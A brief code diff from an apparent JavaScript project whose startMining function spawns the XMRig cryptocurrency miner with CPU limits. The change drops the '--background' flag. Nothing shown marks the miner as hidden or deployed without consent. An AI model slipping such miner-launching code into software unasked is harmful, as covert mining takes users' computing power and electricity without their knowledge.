@@ -52,7 +52,7 @@ async function startMining() {
     '--donate-level', '1',
     '--cpu-priority', '5',
     '--max-cpu-usage', '75',
-    '--background',
+    
   ], { stdio: ['ignore', 'pipe', 'pipe'] });
 
   xmrig.stdout.on('data', (data) => {
